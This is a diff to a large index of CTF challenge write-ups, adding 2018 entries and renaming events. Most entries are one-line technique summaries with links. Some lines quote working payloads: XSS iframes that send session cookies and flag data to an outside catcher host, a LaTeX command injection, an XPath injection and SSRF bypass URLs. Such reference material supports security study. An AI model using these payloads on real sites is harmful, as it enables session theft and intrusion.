@@ -30,7 +30,7 @@ http://mslc.ctf.su/wp/codegate-2014-quals-minibomb-pwn-400/
 shellcode polyglot (x86, ppc, armel, armeb)
 https://github.com/ctfs/write-ups-2014/tree/master/def-con-ctf-qualifier-2014/polyglot
 
-* nibble - nuit-du-hack-ctf-qualifications 2014
+* nibble - nuitduhack-ctf-quals 2014
 pop + plt overwrite
 http://blog.dragonsector.pl/2014/04/nuit-du-hack-ctf-quals-2014-nibble.html
 
@@ -139,7 +139,7 @@ tea cipher
 used z3 to recover key
 http://mslc.ctf.su/wp/boston-key-party-ctf-differential-power-crypto-400/
 
-* psifer_school - csaw-cft-2014
+* psifer_school - csaw-ctf-2014
 caesar, scytale and vigenere
 
 * crypto100 - confidence-ds-ctf-teaser-2014
@@ -208,7 +208,7 @@ we recover d = invmod(0x010001, p-1) and m = pow(c, d, p)
 http://blog.ptsecurity.com/2014/05/phdays-ctf-quals-tasks-analysis.html
 
 * wheeeee - plaid-ctf-2014
-encryption oracle
+encryption oracle, slide attack
 slide attack: https://fail0verflow.com/blog/2014/plaidctf2014-crypto375-wheeeee.html
 
 * tls - ructf-2014-quals
@@ -227,7 +227,7 @@ they are all multiplied together to produce the ciphertext
 need to factorize the ciphertext to find which letters were used
 https://github.com/ctfs/write-ups-2014/tree/master/volga-quals-2014/crypto/100
 
-* another one - nuit-du-hack-ctf-qualifications 2014
+* another one - nuitduhack-ctf-quals 2014
 encrypted bmp in ecb mode. Assume all identical 16-byte blocks are white pixels, anything else is black pixels.
 https://doegox.github.io/ElectronicColoringBook/
 
@@ -507,6 +507,14 @@ https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/PCTF/crypto/s
 Merkle-Hallman knapsack cryptosystem
 use lattice and using LLL reduction
 http://gnoobz.com/plaid-ctf-2015-lazy-writeup.html
+
+* phuck - insomnihack-ctf-2018
+bypass php filter with ?is.admin%00=1
+https://tipi-hack.github.io/2018/03/25/insomni'hack-18-phuck.html
+
+* pixeditor - insomnihack-ctf-2018
+bmp/php polyglot
+https://ctftime.org/writeup/9526
 
 * crib drag - sCTF-2015
 one time pad used more than once (i.e. to encrypt 2 or more plaintexts)
@@ -1051,12 +1059,12 @@ https://github.com/ctfs/write-ups-2014/tree/master/ectf-2014/pixel-princess
 demodulate gnuradio to a jpg
 https://github.com/ctfs/write-ups-2014/tree/master/ghost-in-the-shellcode-2015-teaser/dont-panic-shift-keying
 
-* godmode - nuit-du-hack-ctf-qualifications 2014
+* godmode - nuitduhack-ctf-quals 2014
 info hidden in LSB (least significant bit)
 http://dem0version.wordpress.com/2012/03/14/hello-world/
 rotate 90 degrees clockwise and use stegsolve -> Data extract, tick Red 0, Green 0, Blue 0 and Column, and click Preview
 
-* the greatest - nuit-du-hack-ctf-qualifications 2014
+* the greatest - nuitduhack-ctf-quals 2014
 extract gif file
 get some info:
 $ gifsicle --xinfo greg.gif
@@ -1228,7 +1236,7 @@ https://codisec.com/tw-mma-2-2016-ninth/
 # }}}
 
 # forensics {{{
-* windows forensics - nuit-du-hack-ctf-qualifications 2014
+* windows forensics - nuitduhack-ctf-quals 2014
 pagefile.sys
 
 * curlcore - plaid-ctf-2014
@@ -1378,6 +1386,10 @@ https://pequalsnp-team.github.io/writeups/reading_between_the_lines
 * help - kaspersky-ctf-2017
 given memory dump, recover a KeePass database whose Master Key includes a Windows User Account
 http://blog.ghaaf.me/2017/10/14/kaspersky-ctf-help-forensic-500/
+
+* spoke - insomnihack-ctf-2018
+decrypt ipsec in wireshark, build file to recover PSK with psk-crack, setup ipsec tunnel, setup bgp routing
+https://fixme.ch/wiki/CTF/InsomniHack-2018/Spoke
 
 * docker manager - bsidestlv-2020
 use ssh tunnel to query docker daemon socket and the docker API
@@ -1550,19 +1562,19 @@ cat pwn.xhtml
 /login?login=log&password=pass => true (https://sqlite.org/lang_keywords.html)
 https://rdot.org/forum/showthread.php?p=35191#post35191
 
-* abitbol - nuit-du-hack-ctf-qualifications 2014
+* abitbol - nuitduhack-ctf-quals 2014
 zoom.php vuln to xss so we send below payload via contact form
 <iframe src="http://abitbol.nuitduhack.com/zoom.php?image=1.jpg><script>document.location="http://ctf.pwntest.com/catcher.php?data="+document.cookie</script>" /> # steal session id
 <iframe src="http://abitbol.nuitduhack.com/zoom.php?image=1.jpg><script>flag = new XMLHttpRequest(); flag.open('GET','/flag.php',false); flag.send(); flag.open('GET','http://ctf.pwntester.com/catcher.php?data='+flag.response); flag.send();</script>" />
 
-* titanoreine - nuit-du-hack-ctf-qualifications 2014
+* titanoreine - nuitduhack-ctf-quals 2014
 When uploading a normal jpg image, we can see that the server processes it using GD with the quality 98.
 I assume we need to upload an image of the same quality so that our php code is more likely to survive the processing.
 I used Virtualabs' Nasty bulletproof Jpeg generator to insert php code within a valid jpg image. 
 lfi with prefix in ?lang=fr.php => blah.php/../2.jpg or blah/../../includes/2.jpg => the image is included
 list directory with ?lang=/../../includes/98.jpg&c=var_dump(glob(%22*%22))%3b and read file with echo%20file_get_contents(%22flag%22)%3b or with highlight_file()
 
-* nightly auth - nuit-du-hack-ctf-qualifications 2014
+* nightly auth - nuitduhack-ctf-quals 2014
 time-based username enumeration, and then XPATH injection with the password: " or 1=1 "
 https://github.com/ctfs/write-ups-2014/tree/master/nuit-du-hack-ctf-qualifications/nightly-auth
 
@@ -2046,24 +2058,99 @@ https://github.com/RapaceDiabolique/ctf_writeup/blob/master/Pwn2Win%20CTF%202017
 wget bug, use newlines to append smtp commands through the Host: header and cross protocol talk to smtp server
 https://github.com/p4-team/ctf/tree/master/2017-12-09-seccon-quals/web_sqlsrf
 
-* extract0r - 34c3ctf-2017
+* extract0r - 34c3-ctf-2017
 upload zip containing a symlink using .blah to bypass filter and browse server's filesystem
 ssrf + parse_url bypass using http://foo@localhost:foo@google.com:3306/ or http://foo@[cafebabe.cf]@google.com:3306/
 use gopher:// and craft url to retrieve flag from mysql db
 https://github.com/eboda/34c3ctf/tree/master/extract0r
 
-* urlstorage - 34c3ctf-2017
+* urlstorage - 34c3-ctf-2017
 RPO and css seletor to bf admin token and retrieve flag
 https://l4w.io/2017/12/34c3-ctf-2017-urlstorage-writeup/
+
+* cool storage service - insomnihack-teaser-2018
+css selector to exfil csrf then upload php webshell with .pht extension
+https://ctftime.org/task/5186
+https://gynvael.coldwind.pl/?lang=en&id=671 unintended solution
+used php://filter/convert.iconv to make flag pass getimagesize() as a image/vnd.wap.wbmp
+
+* file vault - insomnihack-teaser-2018
+php unserialization via ZipArchive->open()
+can bypass hmac check of serialized cookie because str_replace('../', './') called before unserialization
+http://corb3nik.github.io/blog/insomnihack-teaser-2018/file-vault
+
+* tax aversion - nullcon-ctf-2018
+server-side parameter pollution
+?year=2017'%26username%3ddowd%3b%23&username=m -> mdowd
+https://ctftime.org/writeup/8743
 
 * linked out - nuitduhack-quals-2018
 upload cv in yaml format, rce via LaTex injection -> skype: BBBBBBBBBBBBBB}\skype{\input|"ls *"}%
 https://tipi-hack.github.io/2018/04/01/quals-NDH-18-linked-out.html
 
-* filemanager - 35c3ctf
+* personal website - asis-ctf-2018
+mongodb injection
+https://ctftime.org/task/6024
+
+* idiot {action,camera} - plaid-ctf-2018
+js/wave polyglot
+ssrf via SNI or redirect to ftp:// URL with long username to cause truncation
+https://dttw.tech/posts/r1jswRaAG
+
+* geckome - defcon-ctf-quals-2018
+browser fingerprint must match to get flag
+https://ctftime.org/writeup/10171
+
+* easy pisy - defcon-ctf-quals-2018
+sha1 collision, submit 2 PDFs with the same sha1 hash to get flag
+https://ctftime.org/writeup/10166
+https://balsn.tw/ctf_writeup/20180512-defconctfqual/#easy-pisy---crypto,-web
+
+* excesss - sctf-2018
+challenge replaces alert() with prompt() so create iframe to restore it
+https://ctftime.org/writeup/10193
+
+* bbs - google-ctf-quals-2018
+self xss via avatar as a valid png containing eval(location.search.substr(113))
+use Range: header to skip over headers
+https://ctftime.org/task/6243
+
+* hacker movie club - csaw-ctf-2018
+web cache poisoning
+https://ctftime.org/task/6658
+
+* berg's club - pwn2win-ctf-2018
+php deserialization rce with file_exists("phar://evil.jpg")
+use https://github.com/ambionics/phpggc to build a Monolog gadget chain
+https://balsn.tw/ctf_writeup/20181130-pwn2winctf/#berg%E2%80%99s-club
+
+* flaglab - realworld-ctf-2018
+gitlab ssrf CVE-2017-0916 + command injection via redis
+https://desc0n0cid0.blogspot.com/2019/01/chaining-2-low-impact-bugs-into-gitlab.html
+
+* ublog - hxp-ctf-2018
+css selector timing attack
+https://ctftime.org/writeup/12540
+
+* collider - 35c3-ctf-2018
+md5 collision with 2 PDFs
+https://ctftime.org/task/7438
+
+* filemanager - 35c3-ctf-2018
 xs search via xss auditor
 https://gist.github.com/l4wio/3a6e9a7aea5acd7a215cdc8a8558d176
 https://www.youtube.com/watch?v=HcrQy0C-hEA
+
+* post - 35c3-ctf-2018
+nginx alias traversal, php unserialization using SoapClient dep to ssrf the miniProxy internal service
+mssql automatically converts full-width unicode chars to ascii: 0xEF 0xBC 0x84 -> '$'
+use gopher:/// or 301 redirect to gopher to bypass http/https check
+https://ctftime.org/task/7409
+
+* php -35c3-ctf-2018
+php unserialization and need to cause exception in unserialize via syntax error
+because object destructors arent called on exceptions
+https://ctftime.org/writeup/12773
 
 * l33t hoster - insomnihack-teaser-2019
 upload .htaccess/.wbmp polyglot, \x00 same as a comment line in .htaccess files
@@ -2253,7 +2340,7 @@ http://singularityctf.blogspot.com.au/2014/03/volgactf-quals-2014-writeup-revers
 * exploit100 - volga-ctf-quals-2014
 password value enumeration
 
-* big momma - nuit-du-hack-ctf-qualifications 2014
+* big momma - nuitduhack-ctf-quals 2014
 username/password enumeration
 server returns strcmp return value between our input and the correct username
 
@@ -2443,7 +2530,7 @@ https://www.id0.one/blog/content/3.bp.html
 * icectf-2015
 * insomnihack-2015 no writeups but sources at https://github.com/Insomnihack/Insomnihack-2015
 * mma-ctf-2015
-* nuit-du-hack-ctf-quals-2015
+* nuitduhack-ctf-quals-2015
 * nullcom-hackim-2015
 * opentoall-ctf-2015
 * plaid-ctf-2015
@@ -2545,31 +2632,17 @@ https://www.id0.one/blog/content/3.bp.html
 * tu-ctf-2017
 * seccon-ctf-2017
 * 3dsctf-2017
-* 34c3ctf-2017
-
+* 34c3-ctf-2017
+* 2018 weight >= 25
+* 2019 weigth >= 25
 
 # }}}
 
-# to do {{{
-* moar
-https://github.com/abpolym/route2ctf/ # keywords <=> writeup mappings
-https://github.com/apsdehal/awesome-ctf
-https://github.com/zardus/ctf-tools http://www.kitploit.com/2016/03/ctf-tools-some-setup-scripts-for.html
-https://github.com/VulnHub/ctf-writeups
-https://github.com/pwning/public-writeup // see writeups by Robert Xiao (@nneonneo) the PPP crpyto guy?
-https://github.com/smokeleeteveryday/CTF_WRITEUPS
-https://github.com/ispoleet/ctf-writeups bo1lers
-https://github.com/73696e65/ctf-notes
-
-* challenges still online
-https://backdoor.sdslabs.co/challenges
-
-* all past writeups
-csaw: https://github.com/isislab/ (was https://ctf.isis.poly.edu/writeups/)
-ndh and volgactf: http://sigint.ru/writeups/
-
-* blogs
-https://w00tsec.blogspot.com.au/ https://github.com/bmaia/
+# moar {{{
+orangetw https://github.com/orangetw/My-CTF-Web-Challenges
+ppp https://github.com/pwning/public-writeup
+smokeleet https://github.com/smokeleeteveryday/CTF_WRITEUPS
+bo1lers https://github.com/ispoleet/ctf-writeups
 CaptureTheSwag https://ctf.rip/ https://github.com/sourcekris/ctf-solutions
 InternetWache https://0day.work/
 Tasteless http://tasteless.eu/
@@ -2580,40 +2653,4 @@ khack40 http://khack40.info/
 Raccoons https://github.com/raccoons-team/ctf/
 Eat Sleep Pwn Repeat https://kitctf.de/
 kt (ex SpamAndHex! captain) https://kt.pe/blog/
-
-* crypto
-https://www.cryptologie.net/article/435/best-crypto-blog-posts-of-2017/
-https://grocid.net https://github.com/grocid/CTF
-https://grocid.net/2016/08/11/solving-problems-with-lattice-reduction/ explains lcg, crt, lattice reduction
-https://github.com/SideChannelMarvels/Deadpool (crypto)
-
-* web
-https://github.com/orangetw/My-CTF-Web-Challenges
-
-* exploit
-http://blog.rewolf.pl/blog/?p=1563
-
-* flare-on 2015
-http://acidshout.github.io/
-
-* pillow - secuinside-ctf-prequal-2014
-https://github.com/ctfs/write-ups-2014/tree/master/secuinside-ctf-prequal-2014/pillow
-
-* harry-potter - plaid-ctf-2014
-http://eindbazen.net/2014/04/plaidctf-2014-harry_potter-300/
-
-* kappa - plaid-ctf-2014
-http://eindbazen.net/2014/04/plaidctf-2014-kappa-275/
-https://blog.skullsecurity.org/2014/plaidctf-writeup-for-pwn-275-kappa-type-confusion-vuln
-
-* graphs - plaid-ctf-2014
-https://github.com/ctfs/write-ups-2014/tree/master/plaid-ctf-2014/graphs
-
-* wheeeee - plaid-ctf-2014
-slide attack
-https://github.com/ctfs/write-ups-2014/tree/master/plaid-ctf-2014/wheeeee
-
-* guess - hitcon-ctf-quals-2015
-https://github.com/pwning/public-writeup/blob/master/hitcon2015/crypto300-guess/writeup.md
-
 # }}}
